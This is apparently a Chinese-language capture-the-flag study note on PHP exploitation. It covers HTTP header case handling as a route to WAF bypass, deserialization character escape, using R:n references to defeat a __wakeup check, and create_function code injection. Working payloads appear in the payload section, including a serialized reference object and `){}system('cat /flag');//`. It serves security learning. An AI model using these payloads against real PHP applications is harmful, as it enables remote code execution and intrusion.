## 二、知识点

### 1. HTTP 头：大小写与空白

| 问题 | 规范 | 靶机（Apache 2.4.10）实测 |
|---|---|---|
| 头名大小写 | 不敏感（RFC 7230） | `content-type` / `CoNtEnT-TyPe` 都认 |
| 媒体类型大小写 | 不敏感（RFC 2045） | `APPLICATION/X-WWW-FORM-URLENCODED` 也认 |
| 冒号后空格 | OWS，可有可无 | 0 个 / 1 个 / 3 个都行 |

关键认知：规范与实现的偏差 = 请求走私 / WAF 绕过的根源。大小写不敏感还是"首值优先"能生效的前提（否则我们注入的头和原本的头就是"两个不同的头"，谈不上覆盖）。

### 2. PHP 反序列化字符逃逸

```php
filePutStr: str_replace("\0\0", "0000", $s)   // 3 字节 → 5 字节  (+2)
fileGetStr: str_replace("0000", "\0\0", $s)   // 5 字节 → 3 字节  (-2)
```

| 你在 data 里放什么 | 写盘时 | 读盘时 | 净效果 |
|---|---|---|---|
| `\0\0`（真 NUL） | +2 | −2 | 0（往返抵消） |
| `0000`（纯 ASCII） | 不动 | −2 | −2 逃逸燃料 |

为什么 `0000` 是"单向阀"：写的时候 `str_replace` 找的是 `002a00`（含 NUL），不匹配纯 ASCII 的 `30302a3030` → 原样；读的时候找的正是 `30302a3030` → 命中 → 缩短 2 字节。

而 `serialize()` 的长度是替换前算的，之后没人更新它 → 声明长度 > 实际长度 → 解析器多读 → 结构错位。

> 顺带：`\0\0` 是 PHP 序列化 protected 属性名的前缀（`\0\0function`），`\0类名\0名` 是 private。用 NUL 当分隔符是因为标识符里不可能出现 NUL，天然零冲突。

### 3. PHP 引用反序列化（un3 的核心考点）

```php
function __wakeup() {
    $this->password = $nobodyknow;               // 用未知值覆盖
    if ($this->password === $this->verify) {     // 严格比较
        echo $flag;
    }
}
```

三道防线：未知值覆盖（堵猜值）+ `===`（堵弱类型）+ 先覆盖后比较（堵"让 payload 里两个值相等"）。

唯一出路：让两个属性成为同一个变量：

```php
$this->verify = &$this->password;      // & = 起别名，不是复制
```

序列化后变成：

```
O:5:"funny":2:{s:15:"<NUL>funny<NUL>password";N;s:6:"verify";R:2;}
```

`R:n` 编号规则（实测确认）：

| 规则 | 说明 |
|---|---|
| 编号从 1 开始 |  |
| 容器（对象/数组）自己占 #1 | 实测 `R:1` 会指向容器本身，形成递归 |
| 只数值，属性名/数组键不占号 | 3 属性对象里 `p3` 引用 `p2` = `R:3`（不是 4） |
| `R:` 本身不占号 | 它只"指向已有的号"，不创造新值 |
| 只能后向引用 |  |

两种"共享"的本质区别：

|  | 普通赋值 | 引用 |
|---|---|---|
| 内部结构 | 两个 zval（COW 暂时共享） | 两个 zval 都指向同一个 `zend_reference` |
| 改一个之后 | 另一个不变（写时分家） | 另一个跟着变 |
| `===` 能过吗 | 能（但会被事后覆盖破坏） | 永远能 |
| 本质 | 两份数据碰巧一样 | 只有一份数据 |

### 4. `create_function` 就是 `eval`

```php
create_function($shell, $nss)
// 内部拼出： "function __lambda_func($shell) { $nss }"  然后 eval
```

- 第一个参数占据"函数参数列表"位置 → 语法上只接受 `$变量`（写 `1` → 整个 eval 编译失败 → `nss` 里的代码一个字节都不跑）
- 它是 eval，不是"定义函数" → 顶层语句会立即执行，函数定义只是顺带注册
- 正确 payload：`){}system('cat /flag');//` —— `)` 闭合参数列表、`{}` 立刻结束函数体、顶层写命令、`//` 注释残骸

## 三、案例 / payload

### 1. un3 引用 payload（三种写法都通，发送方式不同）

```
# ① 真 NUL（必须 urlencode 或走文件，否则 NUL 会丢）
O:5:"funny":2:{s:15:"<NUL>funny<NUL>password";N;s:6:"verify";R:2;}

# ② %00 字面量（靠服务器的 URL 解码变成 NUL，绝对不能整体编码）
O:5:"funny":2:{s:15:"%00funny%00password";N;s:6:"verify";R:2;}

# ③ S: 格式（纯可打印字符，怎么发都行 最省心）
O:5:"funny":2:{S:15:"\00funny\00password";N;s:6:"verify";R:2;}
```

踩过的两个错（都实测失败）：
- `s:15:"funnypassword"` —— 删了 NUL 但长度没改（19≠15）→ 解析错位
- `s:6:"verify";N;` —— verify 是独立的 null，被 `__wakeup` 覆盖后就不相等了

### 2. NSSCTF Rc3_function

```
POST shell=){}system('cat /flag');//
     nss=1;
```

拆解：`function __lambda_func(){}system('cat /flag');//) { 1; }`
- `)` 闭合参数列表 → `{}` 空函数体 → `system(...)` 顶层立即执行 → `//` 注释残骸

## 四、踩坑点

### A. 反序列化 / 代码注入类

| 问题 | 原因 | 解决 |
|---|---|---|
| un3 的 `%00` 写进 payload 后失败 | 走了 `params=` → `%` 被编成 `%25` → 服务器解码一次只得回字面 `%00` | 要么原样拼 URL，要么改用 `S:` 格式 |
| un3 用 `verify=N` | `__wakeup` 把 password 覆盖成未知值，两个独立槽不再相等 | 必须 `R:2` 引用 |
| `%00` 在源码里被 NUL 吞掉 | 不加 `urlencode` 时 NUL 不可见，复制粘贴会丢 | 输出端就 `urlencode`（`%00` 看得见） |
